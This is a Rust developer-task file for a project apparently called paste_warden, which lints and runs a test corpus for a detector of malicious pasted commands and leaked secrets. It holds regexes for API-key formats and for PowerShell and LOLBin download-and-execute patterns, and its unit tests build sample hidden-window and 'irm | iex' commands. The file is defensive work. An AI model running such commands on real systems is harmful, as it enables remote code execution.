//! Developer tasks.
//!
//! ```text
//! cargo run -p xtask -- corpus lint       # format, ids, Text, op docs, leak scan
//! cargo run -p xtask -- corpus coverage   # every legacy test case is accounted for
//! cargo run -p xtask -- corpus stats      # cases per area / op
//! cargo run -p xtask -- corpus run [--area A] [--op O] [--id PREFIX] [-v]
//! cargo run -p xtask -- corpus benign [-v]  # false-positive metrics
//! ```

use std::collections::{BTreeMap, BTreeSet, HashSet};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::ExitCode;

use anyhow::{Context as _, Result};
use paste_warden_corpus::{
    AREAS, Case, Disposition, LegacyIndex, LegacyProperty, Located, jsonl_files, literal_strings,
    read_jsonl, resolve_all,
};
use regex::Regex;
use serde_json::Value;

fn main() -> ExitCode {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let args: Vec<&str> = args.iter().map(String::as_str).collect();
    let result = match args.as_slice() {
        ["corpus", "lint"] => corpus_lint(),
        ["corpus", "coverage"] => corpus_coverage(),
        ["corpus", "stats"] => corpus_stats(),
        ["corpus", "run", rest @ ..] => corpus_run(rest),
        ["corpus", "benign", rest @ ..] => corpus_benign(rest),
        _ => {
            eprintln!("usage: cargo run -p xtask -- corpus <lint|coverage|stats|run|benign>");
            return ExitCode::from(2);
        }
    };
    match result {
        Ok(true) => ExitCode::SUCCESS,
        Ok(false) => ExitCode::FAILURE,
        Err(e) => {
            eprintln!("error: {e:#}");
            ExitCode::FAILURE
        }
    }
}

fn repo_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .to_path_buf()
}

fn corpus_dir() -> PathBuf {
    repo_root().join("corpus")
}

struct Loaded {
    cases: Vec<Located<Case>>,
    benign: Vec<Located<Case>>,
}

fn load_cases() -> Result<Loaded> {
    let mut cases = Vec::new();
    for f in jsonl_files(&corpus_dir().join("cases"))? {
        cases.extend(read_jsonl::<Case>(&f)?);
    }
    let mut benign = Vec::new();
    for f in jsonl_files(&corpus_dir().join("benign"))? {
        benign.extend(read_jsonl::<Case>(&f)?);
    }
    Ok(Loaded { cases, benign })
}

fn load_index() -> Result<LegacyIndex> {
    let path = corpus_dir().join("legacy-index.json");
    let text = fs::read_to_string(&path).with_context(|| format!("reading {}", path.display()))?;
    Ok(serde_json::from_str(&text)?)
}

fn load_properties() -> Result<Vec<Located<LegacyProperty>>> {
    let mut out = Vec::new();
    for f in jsonl_files(&corpus_dir().join("legacy-properties"))? {
        out.extend(read_jsonl(&f)?);
    }
    Ok(out)
}

/// Collects problems instead of stopping at the first one.
#[derive(Default)]
struct Report {
    errors: Vec<String>,
}

impl Report {
    fn err(&mut self, at: impl std::fmt::Display, msg: impl std::fmt::Display) {
        self.errors.push(format!("{at}: {msg}"));
    }
    fn finish(self, what: &str) -> bool {
        for e in &self.errors {
            eprintln!("  {e}");
        }
        if self.errors.is_empty() {
            println!("{what}: ok");
            true
        } else {
            eprintln!("{what}: {} problem(s)", self.errors.len());
            false
        }
    }
}

fn at<T>(l: &Located<T>) -> String {
    let rel = l.file.strip_prefix(repo_root()).unwrap_or(&l.file);
    format!("{}:{}", rel.display(), l.line)
}

/// Legacy ids referenced by a `source` value, if it is a legacy reference.
fn legacy_ref(source: &str) -> Option<&str> {
    source.strip_prefix("legacy:")
}

/// Does `reference` point at `entry`? Exact match, or an expansion
/// (`Method[k]`) of a fact / memberdata / js entry.
fn refers_to(reference: &str, entry: &str) -> bool {
    reference == entry
        || reference
            .strip_prefix(entry)
            .is_some_and(|rest| rest.starts_with('[') && rest.ends_with(']'))
}

fn corpus_lint() -> Result<bool> {
    let Loaded { cases, benign } = load_cases()?;
    let index = load_index()?;
    let index_ids: Vec<&str> = index.entries.iter().map(|e| e.id.as_str()).collect();
    let index_set: HashSet<&str> = index_ids.iter().copied().collect();
    let mut r = Report::default();

    let id_re = Regex::new(r"^[a-z0-9][a-z0-9._-]*$")?;
    let mut seen: BTreeMap<String, String> = BTreeMap::new();
    let mut op_docs: BTreeMap<String, String> = BTreeMap::new();

    for (l, is_benign) in cases
        .iter()
        .map(|c| (c, false))
        .chain(benign.iter().map(|c| (c, true)))
    {
        let c = &l.value;
        let here = at(l);
        if !id_re.is_match(&c.id) {
            r.err(
                &here,
                format!("id `{}` must match {}", c.id, id_re.as_str()),
            );
        }
        if let Some(prev) = seen.insert(c.id.clone(), here.clone()) {
            r.err(&here, format!("duplicate id `{}` (first at {prev})", c.id));
        }
        if !AREAS.contains(&c.area.as_str()) {
            r.err(&here, format!("unknown area `{}`", c.area));
        }
        match legacy_ref(&c.source) {
            Some(reference) => {
                let known = index_set.contains(reference)
                    || index_ids.iter().any(|e| refers_to(reference, e));
                if !known {
                    r.err(
                        &here,
                        format!("source `{}` is not in legacy-index.json", c.source),
                    );
                }
            }
            None if c.source == "new" => {}
            None => r.err(&here, "source must be `new` or `legacy:<index id>`"),
        }
        for (name, v) in [("input", &c.input), ("args", &c.args)] {
            if let Some(v) = v
                && let Err(e) = resolve_all(v)
            {
                r.err(&here, format!("{name}: {e:#}"));
            }
        }
        if let Some(events) = &c.events {
            for (i, ev) in events.iter().enumerate() {
                if let Err(e) = resolve_all(ev) {
                    r.err(&here, format!("events[{i}]: {e:#}"));
                }
            }
        }
        if is_benign && c.expect != serde_json::json!({"clean": true}) {
            r.err(&here, "benign cases must have expect {\"clean\": true}");
        }
        if !is_benign {
            let doc = op_docs
                .entry(c.area.clone())
                .or_insert_with(|| ops_doc(&c.area));
            let heading = format!("`{}`", c.op);
            let documented = doc
                .lines()
                .any(|line| line.starts_with('#') && line.contains(&heading));
            if !documented {
                r.err(
                    &here,
                    format!(
                        "op `{}` has no heading in corpus/ops/{}[-*].md",
                        c.op, c.area
                    ),
                );
            }
        }
        leak_scan_case(l, &here, &mut r)?;
    }

    for area in AREAS {
        let mut seen_ops: BTreeMap<String, usize> = BTreeMap::new();
        for line in ops_doc(area).lines().filter(|l| l.starts_with('#')) {
            if let Some(op) = line.split('`').nth(1) {
                *seen_ops.entry(op.to_string()).or_insert(0) += 1;
            }
        }
        for (op, n) in seen_ops.into_iter().filter(|(_, n)| *n > 1) {
            r.err(
                format!("corpus/ops/{area}*.md"),
                format!("op `{op}` is defined {n} times"),
            );
        }
    }

    for rules in rule_files()? {
        let text = fs::read_to_string(&rules)?;
        let json: Value =
            serde_json::from_str(&text).with_context(|| format!("parsing {}", rules.display()))?;
        let mut strings = Vec::new();
        literal_strings(&json, "", &mut strings);
        let rel = rules
            .strip_prefix(repo_root())
            .unwrap_or(&rules)
            .display()
            .to_string();
        for (path, s) in strings {
            if let Some(kind) = looks_like_key(&s) {
                r.err(
                    &rel,
                    format!("{path}: literal {kind} (rule files may hold regexes only)"),
                );
            }
        }
    }

    println!(
        "{} cases, {} benign, {} legacy index entries",
        cases.len(),
        benign.len(),
        index.entries.len()
    );
    Ok(r.finish("corpus lint"))
}

/// `ops/<area>.md` plus any `ops/<area>-*.md`, concatenated.
fn ops_doc(area: &str) -> String {
    let dir = corpus_dir().join("ops");
    let mut text = fs::read_to_string(dir.join(format!("{area}.md"))).unwrap_or_default();
    let prefix = format!("{area}-");
    if let Ok(entries) = fs::read_dir(&dir) {
        let mut extra: Vec<PathBuf> = entries
            .filter_map(|e| e.ok().map(|e| e.path()))
            .filter(|p| {
                p.file_name()
                    .and_then(|n| n.to_str())
                    .is_some_and(|n| n.starts_with(&prefix) && n.ends_with(".md"))
            })
            .collect();
        extra.sort();
        for p in extra {
            text.push('\n');
            text.push_str(&fs::read_to_string(p).unwrap_or_default());
        }
    }
    text
}

fn rule_files() -> Result<Vec<PathBuf>> {
    let mut out = Vec::new();
    let mut stack = vec![repo_root().join("rules")];
    while let Some(dir) = stack.pop() {
        if !dir.exists() {
            continue;
        }
        for e in fs::read_dir(&dir)? {
            let p = e?.path();
            if p.is_dir() {
                stack.push(p);
            } else if p.extension().is_some_and(|x| x == "json") {
                out.push(p);
            }
        }
    }
    out.sort();
    Ok(out)
}

/// Literal strings may not contain a complete API key or a complete malicious
/// command: split them with `parts` or generate them with `rand`.
fn leak_scan_case(l: &Located<Case>, here: &str, r: &mut Report) -> Result<()> {
    let c = &l.value;
    let mut strings = Vec::new();
    for (name, v) in [("input", &c.input), ("args", &c.args)] {
        if let Some(v) = v {
            literal_strings(v, &format!("/{name}"), &mut strings);
        }
    }
    if let Some(events) = &c.events {
        literal_strings(&Value::Array(events.clone()), "/events", &mut strings);
    }
    literal_strings(&c.expect, "/expect", &mut strings);
    for (path, s) in strings {
        if let Some(kind) = looks_like_key(&s) {
            r.err(
                here,
                format!("{path}: literal {kind}; build it with `parts` or `rand`"),
            );
        }
        if looks_like_malicious_command(&s) {
            r.err(
                here,
                format!(
                    "{path}: literal looks like a complete malicious command; split the program \
                     name and the dangerous part into separate `parts`"
                ),
            );
        }
    }
    Ok(())
}

fn looks_like_key(s: &str) -> Option<&'static str> {
    use std::sync::OnceLock;
    static RES: OnceLock<Vec<(&'static str, Regex)>> = OnceLock::new();
    let res = RES.get_or_init(|| {
        [
            ("GitHub token", r"\bgh[pousr]_[A-Za-z0-9]{30,}"),
            ("GitHub fine-grained PAT", r"\bgithub_pat_[A-Za-z0-9_]{40,}"),
            (
                "OpenAI/Anthropic key",
                r"\bsk-(?:ant-|proj-)?[A-Za-z0-9_-]{24,}",
            ),
            ("AWS access key", r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"),
            ("Slack token", r"\bxox[abprs]-[A-Za-z0-9-]{10,}"),
            ("Google API key", r"\bAIza[0-9A-Za-z_-]{35}"),
            ("GitLab token", r"\bglpat-[A-Za-z0-9_-]{20,}"),
            ("Stripe key", r"\b(?:sk|rk)_live_[A-Za-z0-9]{20,}"),
            ("npm token", r"\bnpm_[A-Za-z0-9]{36}"),
            (
                "PEM private key",
                r"-----BEGIN [A-Z ]*PRIVATE KEY-----\s*[A-Za-z0-9+/=]{40,}",
            ),
            (
                "JWT",
                r"\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
            ),
        ]
        .into_iter()
        .map(|(k, p)| (k, Regex::new(p).expect("valid key regex")))
        .collect()
    });
    res.iter().find(|(_, re)| re.is_match(s)).map(|(k, _)| *k)
}

fn looks_like_malicious_command(s: &str) -> bool {
    use std::sync::OnceLock;
    static EXEC: OnceLock<Regex> = OnceLock::new();
    static DANGER: OnceLock<Regex> = OnceLock::new();
    let exec = EXEC.get_or_init(|| {
        Regex::new(
            r"(?i)\b(?:powershell|pwsh|mshta|certutil|bitsadmin|rundll32|regsvr32|msiexec|conhost|wscript|cscript)\b|\bcmd(?:\.exe)?\s+/[ck]\b",
        )
        .expect("valid exec regex")
    });
    let danger = DANGER.get_or_init(|| {
        Regex::new(
            r#"(?i)(?:^|\s)[-/]w(?:i(?:n(?:d(?:o(?:w(?:s(?:t(?:y(?:l(?:e)?)?)?)?)?)?)?)?)?)?[\s:]+["']?(?:h|1\b)|(?:^|\s)-e(?:c|nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{16,}|\biex\b|invoke-expression|downloadstring|downloadfile|https?://|-urlcache|/transfer\b|--headless|\|\s*(?:sh|bash|zsh)\b"#,
        )
        .expect("valid danger regex")
    });
    exec.is_match(s) && danger.is_match(s)
}

fn corpus_coverage() -> Result<bool> {
    let Loaded { cases, .. } = load_cases()?;
    let index = load_index()?;
    let props = load_properties()?;
    let case_ids: HashSet<&str> = cases.iter().map(|c| c.value.id.as_str()).collect();
    let mut r = Report::default();

    let mut refs: Vec<&str> = cases
        .iter()
        .filter_map(|c| legacy_ref(&c.value.source))
        .collect();
    for p in &props {
        let here = at(p);
        let v = &p.value;
        let Some(reference) = legacy_ref(&v.source) else {
            r.err(&here, "source must be `legacy:<index id>`");
            continue;
        };
        if !index.entries.iter().any(|e| refers_to(reference, &e.id)) {
            r.err(
                &here,
                format!("source `{}` is not in legacy-index.json", v.source),
            );
        }
        match v.disposition {
            Disposition::Property if v.requirement.is_none() => {
                r.err(&here, "`property` needs a `requirement`")
            }
            Disposition::Obsolete if v.reason.is_none() => {
                r.err(&here, "`obsolete` needs a `reason`")
            }
            Disposition::Covered => match &v.by {
                Some(by) if case_ids.contains(by.as_str()) => {}
                Some(by) => r.err(&here, format!("`by` points at unknown case `{by}`")),
                None => r.err(&here, "`covered` needs `by` (a case id)"),
            },
            _ => {}
        }
        refs.push(reference);
    }

    let mut missing: BTreeMap<&str, Vec<&str>> = BTreeMap::new();
    for e in &index.entries {
        if !refs.iter().any(|r| refers_to(r, &e.id)) {
            let (file, name) = e.id.split_once('#').unwrap_or((&e.id, ""));
            missing.entry(file).or_default().push(name);
        }
    }
    let n_missing: usize = missing.values().map(Vec::len).sum();
    for (file, names) in &missing {
        eprintln!("  {file}: {} uncovered", names.len());
        for n in names {
            eprintln!("    - {n}");
        }
    }
    println!(
        "coverage: {}/{} legacy test cases accounted for",
        index.entries.len() - n_missing,
        index.entries.len()
    );
    if n_missing > 0 {
        r.err(
            "coverage",
            format!("{n_missing} legacy test case(s) not covered"),
        );
    }
    Ok(r.finish("corpus coverage"))
}

fn corpus_stats() -> Result<bool> {
    let Loaded { cases, benign } = load_cases()?;
    let mut by_area: BTreeMap<&str, usize> = BTreeMap::new();
    for c in &cases {
        *by_area.entry(c.value.area.as_str()).or_insert(0) += 1;
    }
    println!("cases by area:");
    for (a, n) in &by_area {
        println!("  {a:<12} {n}");
    }
    println!("cases by op:");
    for (op, n) in paste_warden_corpus::ops_histogram(cases.iter().map(|c| &c.value)) {
        println!("  {op:<32} {n}");
    }
    let files: BTreeSet<_> = benign.iter().map(|c| c.file.clone()).collect();
    println!("benign: {} cases in {} files", benign.len(), files.len());
    Ok(true)
}

fn parse_filter(args: &[&str]) -> (paste_warden_conformance::Filter, bool) {
    let mut f = paste_warden_conformance::Filter::default();
    let mut verbose = false;
    let mut it = args.iter();
    while let Some(a) = it.next() {
        match *a {
            "--area" => f.area = it.next().map(|s| s.to_string()),
            "--op" => f.op = it.next().map(|s| s.to_string()),
            "--id" => f.id = it.next().map(|s| s.to_string()),
            "-v" | "--verbose" => verbose = true,
            other => eprintln!("ignoring unknown argument {other}"),
        }
    }
    (f, verbose)
}

fn corpus_run(args: &[&str]) -> Result<bool> {
    use paste_warden_conformance::{Outcome, run_cases};
    let (filter, verbose) = parse_filter(args);
    let summary = run_cases(&filter)?;
    println!(
        "{:<34} {:>5} {:>5} {:>6} {:>5} {:>5}",
        "op", "pass", "fail", "unimpl", "error", "div"
    );
    let mut tot = [0usize; 5];
    for (op, c) in summary.per_op() {
        println!(
            "{op:<34} {:>5} {:>5} {:>6} {:>5} {:>5}",
            c[0], c[1], c[2], c[3], c[4]
        );
        for i in 0..5 {
            tot[i] += c[i];
        }
    }
    println!(
        "{:<34} {:>5} {:>5} {:>6} {:>5} {:>5}",
        "TOTAL", tot[0], tot[1], tot[2], tot[3], tot[4]
    );
    let failures: Vec<_> = summary
        .failures()
        .filter(|r| r.outcome != Outcome::Unimplemented)
        .collect();
    let shown = if verbose {
        failures.len()
    } else {
        failures.len().min(30)
    };
    for r in &failures[..shown] {
        let rel = r.file.strip_prefix(repo_root()).unwrap_or(&r.file);
        match &r.outcome {
            Outcome::Fail(f) => {
                println!("FAIL {} ({}:{})", r.id, rel.display(), r.line);
                for m in f {
                    println!("     {m}");
                }
            }
            Outcome::Error(e) => println!("ERR  {} ({}:{}): {e}", r.id, rel.display(), r.line),
            _ => {}
        }
    }
    if failures.len() > shown {
        println!("… {} more (use -v)", failures.len() - shown);
    }
    for d in &summary.bad_divergences {
        println!("BAD DIVERGENCE {d}");
    }
    for d in &summary.stale_divergences {
        println!("STALE DIVERGENCE {d} (now passes; remove it)");
    }
    Ok(summary.failures().next().is_none()
        && summary.bad_divergences.is_empty()
        && summary.stale_divergences.is_empty())
}

fn corpus_benign(args: &[&str]) -> Result<bool> {
    let (filter, verbose) = parse_filter(args);
    let stats = paste_warden_conformance::run_benign(&filter)?;
    println!(
        "{:<22} {:>6} {:>8} {:>7} {:>9} {:>7}",
        "file", "total", "flagged", "warned", "escalate", "unimpl"
    );
    for (file, s) in &stats {
        println!(
            "{file:<22} {:>6} {:>8} {:>7} {:>9} {:>7}",
            s.total, s.flagged, s.warned, s.expected_escalations, s.unimplemented
        );
        if verbose {
            for id in &s.flagged_ids {
                println!("    flagged: {id}");
            }
        }
    }
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn refers_to_accepts_exact_and_expansions() {
        assert!(refers_to("a.cs#M", "a.cs#M"));
        assert!(refers_to("a.cs#M[3]", "a.cs#M"));
        assert!(!refers_to("a.cs#Mx", "a.cs#M"));
        assert!(!refers_to("a.cs#M[3", "a.cs#M"));
    }

    #[test]
    fn malicious_heuristic_requires_both_halves() {
        let exec = ["power", "shell"].concat();
        assert!(looks_like_malicious_command(&format!(
            "{exec} -w hidden -c x"
        )));
        assert!(looks_like_malicious_command(&format!(
            "{exec} -c \"irm https://a | iex\""
        )));
        assert!(!looks_like_malicious_command(&format!(
            "I use {exec} every day"
        )));
        assert!(!looks_like_malicious_command("-w hidden -c x"));
        assert!(!looks_like_malicious_command(&exec));
    }

    #[test]
    fn key_heuristic() {
        let key = format!("ghp_{}", "a1".repeat(18));
        assert_eq!(looks_like_key(&key), Some("GitHub token"));
        assert_eq!(looks_like_key("ghp_"), None);
        assert_eq!(looks_like_key("sk-1234"), None);
    }
}
